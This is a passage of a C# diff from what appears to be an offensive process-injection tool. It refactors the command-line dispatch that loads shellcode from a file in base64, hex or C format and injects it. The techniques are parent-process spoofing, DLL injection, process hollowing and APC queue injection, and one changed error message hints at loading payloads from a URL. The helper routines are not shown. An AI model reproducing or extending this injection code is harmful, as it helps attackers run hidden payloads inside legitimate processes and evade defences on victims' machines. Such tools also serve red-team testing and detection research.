-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
+                            if (arguments.ContainsKey("/ppath"))
                             {
-                                buf = Convert.FromBase64String(shellcode);
+                                if (arguments.ContainsKey("/parentproc"))
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with APC Queue Injection Technique.");
+                                    PPIDAPCInject(arguments["/ppath"], buf, parentProc);
+                                }
+                                else
+                                {
+                                    PrintTitle($"[>>] APC Queue Injection Technique.");
+                                    PROCESS_INFORMATION processInfo = ProcHollowing.StartProcess(arguments["/ppath"]);
+                                    APCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
+                                }
                             }
-                            else if (arguments["/f"] == "hex")
+                            else
                             {
-                                buf = StringToByteArray(shellcode);
+                                PrintError("[-] /ppath argument is missing");
                             }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-                            PPIDCodeInject(arguments["/ppath"], buf, parentProc);
-                        }
-                        else if (arguments["/t"] == "5")
-                        {
-                            Console.WriteLine($"[+] Parent Process Spoofing with DLL Injection Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
-                            var dllpath = arguments["/path"];
-                            byte[] buf = Encoding.Default.GetBytes(dllpath);
-                            PPIDDLLInject(arguments["/ppath"], buf, parentProc);
-                        }
-                        else if (arguments["/t"] == "6")
-                        {
-                            Console.WriteLine($"[+] Parent Process Spoofing with Process Hollowing Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
-
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
-                            {
-                                buf = Convert.FromBase64String(shellcode);
-                            }
-                            else if (arguments["/f"] == "hex")
-                            {
-                                buf = StringToByteArray(shellcode);
-                            }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-                            Parent.PPidSpoof(arguments["/ppath"], buf, parentProc);
-                        }
-                        else if (arguments["/t"] == "7")
-                        {
-                            Console.WriteLine($"[+] APC Queue Injection Technique.");
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
-                            {
-                                buf = Convert.FromBase64String(shellcode);
-                            }
-                            else if (arguments["/f"] == "hex")
-                            {
-                                buf = StringToByteArray(shellcode);
-                            }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-                            PROCESS_INFORMATION processInfo = ProcHollowing.StartProcess(arguments["/ppath"]);
-                            APCInject(processInfo.dwProcessId, processInfo.dwThreadId,buf);
-                        }
-                        else if (arguments["/t"] == "8")
-                        {
-                            Console.WriteLine($"[+] Parent Process Spoofing with APC Queue Injection Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
-                            {
-                                buf = Convert.FromBase64String(shellcode);
-                            }
-                            else if (arguments["/f"] == "hex")
-                            {
-                                buf = StringToByteArray(shellcode);
-                            }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-                            PPIDAPCInject(arguments["/ppath"], buf, parentProc);
                         }
                     }
                     else
                     {
-                        Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
+                        PrintError("[-] Please check the specified file path or the URL.");
                     }
                 }
                 else
                 {
-                    Console.WriteLine("[+] Invalid argument. Please refer the help section for more details.");
+                    PrintError("[-] Invalid argument. Please refer the help section for more details.");
                     help();
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                PrintError(ex.Message);
             }
         }
     }
